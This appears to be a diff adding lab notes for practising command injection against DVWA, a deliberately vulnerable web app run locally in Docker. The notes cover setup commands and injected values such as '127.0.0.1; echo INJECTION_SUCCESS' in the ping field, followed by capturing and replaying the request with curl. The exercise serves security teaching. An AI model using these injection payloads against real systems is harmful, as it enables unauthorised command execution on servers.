@@ -1,0 +1,31 @@
+Commands to be excecuted
+sudo apt update
+sudo apt install -y docker.io
+sudo systemctl enable --now docker
+sudo usermod -aG docker $USER
+sudo docker run --rm -d --name dvwa -p 8080:80 vulnerables/web-dvwa
+sudo docker ps
+
+
+Open DVWA in the browser
+Open one of these URLs in the VM browser (use whichever works; /index.php or root):
+http://127.0.0.1:8080/
+In the Command Injection input box enter:
+127.0.0.1, also similarly do for 127.0.0.1; echo INJECTION_SUCCESS; 127.0.0.1 &amp;&amp; uname –a; 127.0.0.1; ping -c 2 127.0.0.1.
+
+
+A. Capture the request
+1. Open DevTools → Network and copy the curl code of each and excecute curl command.
+
+2. Submit DVWA form once with 127.0.0.1.
+3. In Network list locate the request (likely POST /vulnerabilities/exec/).
+4. Right-click → Copy → Copy as cURL.
+In the POST data change ip=127.0.0.1 → ip=127.0.0.1; echo INJECTION_SUCCESS
+(keep cookies &amp; tokens unchanged).
+5— Replay proof using your captured curl (request→response)
+Edit your copied curl; change only --data-raw:
+Show marker in terminal (grep):
+&lt;the-curl-above&gt; 2&gt;/dev/null | grep -C2 INJECTION_SUCCESS || echo &quot;marker not found&quot;
+
+sudo docker exec -it dvwa bash -lc &#39;tail -n 120 /var/log/apache2/access.log&#39;
+
